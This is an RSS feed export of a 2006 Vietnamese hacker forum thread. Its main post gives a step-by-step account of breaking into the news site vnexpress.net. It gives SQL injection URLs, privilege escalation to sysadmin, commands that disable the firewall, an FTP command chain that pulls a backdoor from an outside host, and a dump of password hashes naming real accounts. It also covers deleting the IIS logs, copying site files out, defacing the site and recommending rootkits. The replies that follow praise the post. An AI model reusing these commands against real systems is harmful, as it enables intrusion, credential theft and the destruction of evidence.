@@ -1,0 +1,323 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Thỏa hiệp VnExpress.NET"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Thỏa hiệp VnExpress.NET"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Thỏa hiệp VnExpress.NET</title>
+				<description><![CDATA[ Origin post from vkdt.
+
+<b>Thỏa hiệp VnExpress.NET</b>
+
+Đây là từng buớc mà mình đã làm để thỏa hiệp website<span class="link"> http://vnexpress.net/.</span>
+
+Để an toàn khi hack, mình set lại proxy trong IE5 là proxy.ia2.marketscore.com:80. Xong, bây giờ bắt đầu vào<span class="link"> http://vnexpress.net/.</span> Loay hoay một chặp trên VnExpress để tìm lỗi SQL Injection, mục Rao Vặt:
+<span class="link"> http://vnexpress.n</span> et/User/Rao-vat/Source/View.asp?ID=500006378&c=3' 
+
+HTTP 500.100 - Internal Server Error - ASP error
+Internet Information Services
+
+Error Type:
+Unclosed quotation mark before the character string '' /User/Rao-vat/Source/Detail.Asp, line 114
+
+Yeah!
+
+Mình thử dùng các kí tự khác ngoài dấu ': " , ( ) để biết được chính xác URL khai thác:
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...=500006378&c=3</span>) ...
+
+Bây giờ đến việc tiến hành xâm nhập vào máy chủ này qua lỗi SQL Injection!
+
+- Đầu tiên mình xác định xem phiên bản của MSSQL và Windows NT:
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/View.asp?ID=50000</span> 6378&c=3) and 1=convert(int,@@version)--sp_password
+
+Syntax error converting the nvarchar value 'Microsoft SQL Server 2000 - 8.00.655 (Intel X86) Jul 3 2002 18:10:57 Copyright © 1988-2000 Microsoft Corporation Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 3)' to a column of data type int. /User/Rao-vat/Source/Detail.Asp, line 114
+
+(Để tránh ghi nhật kí trong MSSQL, mình thêm sp_password vào sau --. Khi MSSSQL phát hiện ra chuổi 'sp_password' trong câu lệnh SQL, nó sẽ ghi nhật kí như sau: -- 'sp_password' was found in the text of this event. -- The text has been replaced with this comment for security reasons.. Để cho đơn giản, từ đây mình sẽ ghi tắc --sp_password là -- nha)
+
++ SQL 2000 8.00.655 03/07/2002
++ Windows 2000 5.0 Build 2196 SP3
+
+- Mình xác định tiếp tên người dùng hiện tại và tên CSDL đang làm việc:
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...p?ID=500006378&</span> c=3) and 1=convert(int,system_user)--
+
+Syntax error converting the nvarchar value 'IUSR_WIN10814' to a column of data type int. /User/Rao-vat/Source/Detail.Asp, line 114
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...ID=500006378&c=</span> 3) and 1=convert(int,db_name())--
+
+Syntax error converting the nvarchar value 'Infostore' to a column of data type int. /User/Rao-vat/Source/Detail.Asp, line 114
+
+Username hiện tại không phải là sa hoặc BUILTIN\Administrators nên không thể xài master..xp_cmdshell. SQL ngày 03/07/2002, đang chạy với Windows Authentication user là IUSR_WIN10814, hơi cũ so với ngày hiện tại. Mình vào trang<span class="link"> http://www.securiteam.com/</span> và search các lỗi của MSSQL đã được công bố sau ngày 03/07/2002. Đây là thứ mà mình tìm:
+
+NGSSoftware Insight Security Research Advisory
+
+Name: Extended Stored Procedure Privilege Upgrade
+Systems: Microsoft SQL Server 2000 and 7
+Severity: High Risk
+Category: Privilege Escalation
+Vendor URL: [url=http://www.microsoft.com/
+Author:]http://www.microsoft.com/
+Author:[/url] David Litchfield (david@ngssoftware.com)
+Advisory URL: [url=http://www.ngssoftware.com/advisories/mssql-esppu.txt
+Date:]http://www.ngssoftware.com/advisories/mssq...
+Date:[/url] 15th August 2002
+Advisory number: #NISR15002002A
+
+
+Description
+***********
+Microsoft SQL Server 2000 and 7 extends functionality by using extended
+stored procedures. Three particular extended stored procedures contain a
+vulnerability that allow a low privileged user to run abritrary SQL queries
+in the context of the
+account running SQL Server.
+
+Details
+*******
+SQL Server supports two forms of authentication. The first is where a user
+uses an SQL login and password to authenticate and the second is through
+Windows Authentication. Any user authenticated by Windows can "upgrade"
+their privileges to that of the account running the SQL Server by using one
+of three extended stored procedures. These stored procedures allow a user to
+run an arbitrary SQL query. By exploiting this problem a low privileged user
+will be able to run any stored procedure, extended or otherwise, and select
+from, update or insert into any table in any database. That is by exploiting
+these holes an attacker can fully compromise the database server and its
+data. Whilst an SQL Login user can not directly exploit this vulnerability
+they can do so indirectly by submitting a job to the SQL Agent. As this the
+SQL Agent authenticates to the SQL Server and runs in the context of Windows
+account these vulnerabilities can be exploited. Please see NGSSoftware alert
+NISR15002002A <span class="link"> http://www.ngssoftware.com/advisories/mssql-esppu.txt</span>) for
+more details.
+
+Fix Information
+***************
+NGSSoftware informed Microsoft of these issues in July. Microsoft has
+produced a patch that resolves these issues. Please see
+<span class="link"> http://www.microsoft.com/technet/treeview/...chnet/security/</span>
+bullet in/MS02-043.asp
+
+for more details.
+
+For those SQL Server database administrators who are not able to patch
+immediately NGSSoftware recommend that they remove public access to these
+stored procedures. This will prevent low privileged users from accessing
+these extended stored procedures.
+
+xp_execresultset
+xp_printstatements
+xp_displayparamstmt
+
+A check for this vulnerability has been added to Typhon II, NGSSoftware's
+vulnerability assessment scanner, of which, more information is available
+from the NGSSite,<span class="link"> http://www.ngssoftware.com/.</span> Username hiện tại là IUSR_WIN10814, thuộc loại Windows Authentication nên chúng ta có thể dùng xp_displayparamstmt để nâng quyền của username này lên dbo.
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/View.asp?</span> ID=500006378&c=3);exec master..xp_displayparamstmt N'sp_addsrvrolemember ''IUSR_WIN10814'',''sysadmin''',N'master',1--
+
+Mình add user IUSR_WIN10814 vào nhóm sysadmin để có thể dùng được master..xp_cmdshell
+
+Xác định lại username hiện tại xem sao?
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...p?ID=500006378&</span> c=3) and 1=convert(int,user_name())--
+
+Syntax error converting the nvarchar value 'dbo' to a column of data type int. /User/Rao-vat/Source/Detail.Asp, line 114
+
+DBO - Chúng ta đang có quyền hạn cao nhất trên máy chủ MSSQL đó nha.
+
+Tiếp theo mình xác định địa chỉ IP của máy chủ này như sau:
+
+Đầu tiên tạo một bảng chứa dữ liệu và đổ kết quả của lệnh exec master..xp_cmdshell 'ipconfig' vào bảng này.
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...378&c=3</span>);create table systables(a int identity,b varchar(1000)) insert into systables exec master..xp_cmdshell 'ipconfig'--
+
+Việc còn lại là lấy kết quả từ bảng systables:
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...=500006378&c=3</span>) and 1=convert(int,(select top 1 b from systables where b like '%25IP Address%25'))--
+
+(%25 == "%")
+
+Syntax error converting the nvarchar value ' IP Address. . . . . . . . . . . . : 10.244.63.231 ' to a column of data type int. /User/Rao-vat/Source/Detail.Asp, line 114
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...p?ID=500006378&</span> c=3) and 1=convert(int,(select b from systables where b like '%25IP Address%25') and b not in('%2510.244.63.231%25'))--
+
+Syntax error converting the nvarchar value ' IP Address. . . . . . . . . . . . : 198.64.129.137 ' to a column of data type int. /User/Rao-vat/Source/Detail.Asp, line 114
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/Vie</span> w.asp?ID=500006378&c=3) and 1=convert(int,(select b from systables where b like '%25IP Address%25') and b not in('%2510.244.63.231%25','%25198.64.129.137%25'))--
+
+Syntax error converting the nvarchar value ' IP Address. . . . . . . . . . . . : 198.64.132.21 ' to a column of data type int. /User/Rao-vat/Source/Detail.Asp, line 114
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...006378&c=3</span>) and 1=convert(int,(select b from systables where b like '%25IP Address%25') and b not in('%2510.244.63.231%25','%25198.64.132.21%25','%25198.64.129.137%25','%25198.64.132.21%25'))--</ A>
+
+Syntax error converting the nvarchar value ' IP Address. . . . . . . . . . . . : 198.64.132. 22' to a column of data type int. /User/Rao-vat/Source/Detail.Asp, line 114
+
+Hì hì, nó có đến 4 địa chỉ IP luôn!
+
+Mình thử ping đến vnexpress.net để xem thử địa chỉ IP của Web Server ra sao?
+
+C:\>ping vnpress.net
+
+Pinging vnexpress.net [198.64.132.22] with 32 bytes of data:
+
+Reply from 198.64.132.22: bytes=32 time=344ms TTL=105
+Control-C
+
+Như vậy IIS và MSSQL đều được cài trên cùng một máy chủ.
+
+Thử nối đến cổng cổng 1433 bằng Netcat xem sao?
+
+C:\>nc -vv -n 198.64.132.22 1433
+(UNKNOWN) [198.64.132.22] 1433 (?): connection refused
+sent 0, rcvd 0: NOTSOCK
+
+VnExpress.NET đã đặt tường lửa cho cổng 1433 rồi. Mình nghĩ khả năng lớn nhất là họ đã dùng tường lửa lọc cổng dữ liệu đi kèm với Windows 2000 Server. Mình quyết định phá tường lửa này.
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...06378&c=3</span>);exec master..xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SYSTEM/CurrentControlSet/Services/Tcpip/Parameters','EnableSecurityFilters' --
+
+Chỉ cần del giá trị EnableSecurityFilters trong khóa HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters là xong.
+
+Nối lại xem sao?
+
+C:\>nc -vv -n 198.64.132.22 1433
+(UNKNOWN) [198.64.132.22] 1433 (?) open
+
+Đúng y như mình đã dự đoán!
+
+Bây giờ đến việc upload backdoor và một vài đồ nghề khác lên server. Mình chuẩn bị sẵn mấy thứ này trong thư mục /vnexpress trên máy chủ FTP free-hosting. Bởi vì việc lấy các file trên FTP hơi lâu nên nếu dùng IE5 thì kết sẽ bị ngắt nữa chừng do lỗi timeout (đang xài kết nối quay số ở ngoài dịch vụ mà) nên mình chuyển sang xài Mini-Browser (*Mini-Browser là một đồ nghề không thể thiếu được khi hack web). Set lại proxy cho Mini-Browser là proxy.ia2.marketscore.com:80 cho chắc.
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...06378&c=3</span>);exec master..xp_cmdshell 'echo open ftp.esmartweb.com >f & echo user username xxxxx >>f & echo bin >>f & echo cd /vnexpress >>f & echo mget * >>f & echo quit >>f & ftp -v -i -n -s:f'--
+
+URLEncode -><span class="link"> http://vnexpress.n</span> et/User/Rao-vat/Source/View.asp?ID=500006378&c=3);exec%20master..xp_cmdshell%20'echo%20open%2 0ftp.esmartweb.com%20%3Ef%20%26%20echo%20user%20username%20xxxxx%20%3E%3Ef%20%26%20echo%20bin%20% 3E%3Ef%20%26%20echo%20cd%20/vnexpress%20%3E%3Ef%20%26%20echo%20mget%20*%20%3E%3Ef%20%26%20echo%20 quit%20%3E%3Ef%20%26%20ftp%20-v%20-i%20-n%20-s%3Af'--
+
+[GET]
+
+Waiting...!
+Done.
+
+Kích hoạt backdoor WinShell 4.0:
+<span class="link"> http://vnexpress.net/User/Rao-vat/Source/V...06378&c=3</span>);exec master..xp_cmdshell 'backup'--
+
+Xong, bây giờ chỉ việc kết nối đến backdoor WinShell. Mình dùng Putty để nối
+
++ Host Name (or IP Address): 198.64.132.22
++ Port: 3371
++ Protocol: (o) Raw
+
+xxxxx
+
+WinShell v4.0
+
+©2001 by janker
+<span class="link"> http://www.bugsos.com/</span>
+
+? for help
+CMD>s
+C:\WINNT\system32>_
+
+- Đổ SAM
+
+Administrator:500:C3591A674B80231AF24E41BBADB86F3F:B0F92BB2E3471150BEC31733D6728
+8EA:Built-in account for administering the computer/domain::
+Guest:501:********************************:********************************: Built-in account for guest access to the computer/domain::
+TsInternetUser:1000:DFA15ABF9536AE19F7FF965C044A5116:D21C509DA73030AD8DA1014 F3A211943:TsInternetUser,This user account is used by Terminal Services.::
+IUSR_WIN10814:1001:9C0887DCB5F1EA859B0B497A5C75047F:A9438645CA94E67F631C2E14E1CD
+F7 D4:Internet Guest Account,Built-in account for anonymous access to Internet Information Services::
+IWAM_WIN10814:1002:A4BE543712EDBA21B0991B757487A81E:BCE493DFA35602091F9285CAEABA
+312 8:Launch IIS Process Account,Built-in account for Internet Information Services to start out of process applications::
+Internet:1003:336F31071CA2B4A0D14C9408F0C70C13:80C82BA8E876F8D59732AC429A93072B :Internet,FPT Internet admin access::
+vReplicator:1004:578BFE097611D01A73545BB507664033:AF30E872418F24EC3FD86F58CB8F0D
+FD:Re plicate Site::
+AdminEditor:1005:A07C0994B7D99B918284770D91848144:121CF5A2FB538FC2EF4918C69EC291
+16:Admi n Editor::
+Thangpv:1006:F138C587F87CB06E29B1F66481A851EE:7AA75649EA242FE1FD76191279F2F407:P
+ham Vinh Thang::
+
+- Xác định WWROOT của IIS
+
+C:\WINNT\system32>reg query "hklm\system\currentcontrolset\services\w3svc\parameters\virtual roots"
+! REG.EXE VERSION 2.0
+
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\w3svc\parameters\virtual roots
+/ REG_SZ D:\Infostore\Master,,201
+/IISHelp REG_SZ C:\WINNT\Help\iisHelp,,201
+/Replicate REG_SZ D:\InfoStore\Replicate,,201
+
+- Xóa nhật kí của IIS (thật sự thì mình không hề bị ghi nhật kí vì Admin của VnExpress.NET đã disable log của IIS do số lượng người truy cập vào trang web này quá đông)
+
+C:\WINNT\system32>reg query hklm\system\currentcontrolset\services\w3svc\parameters /v logfiledirectory
+! REG.EXE VERSION 2.0
+
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\w3svc\parameters
+logfiledirect ory REG_SZ C:\WINNT\System32\LogFiles
+
+C:\WINNT\system32>
+C:\WINNT\system32>dir %systemroot%\system32\logfiles
+Volume in drive C has no label.
+Volume Serial Number is 5C62-FB1E
+
+Directory of C:\WINNT\system32\logfiles
+
+04/19/2002 12:26a <DIR> .
+04/19/2002 12:26a <DIR> ..
+04/19/2002 07:24a <DIR> W3SVC1
+0 File(s) 0 bytes
+
+C:\WINNT\system32>rd /s /q logfiles\w3svc1
+
+- Để xem có gì trong WWROOT không?
+
+D:\InfoStore>dir
+Volume in drive D is InfoStore
+Volume Serial Number is 544E-1C8D
+
+Directory of D:\InfoStore
+
+04/25/2002 08:39a <DIR> .
+04/25/2002 08:39a <DIR> ..
+04/19/2002 10:44a <DIR> ftproot
+09/20/2002 03:29p <DIR> Master
+10/01/2002 01:10p <DIR> Replicate
+0 File(s) 0 bytes
+5 Dir(s) 46,340,067,328 bytes free
+
+Cả khối file tin tức trong thư mục Master. Mình thấy chỉ có Replicate và một số ít các file trong Master là còn có giá trị nên download về.
+
+C:\WINNT\system32>rar -a f.zip d:\infostore\replicate\*.*
+C:\WINNT\system32>copy /y f.zip d:\infostore\master\readme.txt
+
+(dùng Mass Downloader để download file<span class="link"> http://vnexpress.net/readme.txt</span> về)
+
+C:\WINNT\system32>del d:\infostore\master\readme.txt
+
+... và một số việc khác nữa không kể ra ở đây tới.
+
+*Server của VnExpress.NET chẳng có thứ gì ngoài mấy cái tin tức cung cấp miễn phí cho mọi người nên mình quyết định stop tại đây, không xóa bất kì file nào trên server đâu nha. Mình chỉ upload vài file để deface trang VnExpress.NET cho vui thôi.
+
+- À nếu bạn cần cài backdoor/rootkit không bị phát hiện trên Windows NT thì dùng Hacker Defender <span class="link"> http://rootkit.host.sk/</span>) hoặc TYT (<span class="link"> http://www.polarhome.com/~vickit/tyt0/</span> , mã nguồn:<span class="link"> http://www.polarhome.com/~vic</span> ki/hack/congcu/win/tyt0-src.zip) của mình nha. * Hiện tại bản Hacker Defender 0.7.3 không làm việc trên Windows 2000 bản Enterprise. Mình đã test thử trên vài server rồi, trong khi backdoor của mình thì vẫn làm việc tốt đối với bản Enterprise. Khi nào có source-code của HxDef mình sẽ phát triển tiếp con backdoor của mình để cho các bạn xài. Nói thật là mấy thứ backdoor và rootkit này cũng rất dễ bị phát hiện và disable. Hì hì, không nói ở đây nha (để cho an toàn thôi)
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/379.hva#894</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/379.hva#894</link>
+				<pubDate><![CDATA[Sun, 25 Jun 2006 22:24:12]]> GMT</pubDate>
+				<author><![CDATA[ caothuvolam]]></author>
+			</item>
+			<item>
+				<title>Thỏa hiệp VnExpress.NET</title>
+				<description><![CDATA[  Tuyệt quá :) Đọc bài của ctvl làm em mở mang đầu óc được nhiều điều :) bravo bravo ....]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/379.hva#1774</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/379.hva#1774</link>
+				<pubDate><![CDATA[Wed, 28 Jun 2006 12:55:45]]> GMT</pubDate>
+				<author><![CDATA[ chupichu]]></author>
+			</item>
+			<item>
+				<title>Thỏa hiệp VnExpress.NET</title>
+				<description><![CDATA[ cái này Zazu đã chiến rồi mà!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/379.hva#55304</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/379.hva#55304</link>
+				<pubDate><![CDATA[Mon, 23 Apr 2007 03:58:49]]> GMT</pubDate>
+				<author><![CDATA[ SonNguyen_sn]]></author>
+			</item>
+			<item>
+				<title>Thỏa hiệp VnExpress.NET</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">SonNguyen_sn wrote:</cite><br>
+		<blockquote>cái này Zazu đã chiến rồi mà!&nbsp;
+		</blockquote>
+
+Xem lại cái ngày CTVL đăng bài này.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/379.hva#55309</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/379.hva#55309</link>
+				<pubDate><![CDATA[Mon, 23 Apr 2007 06:28:15]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+	</channel>
+</rss>
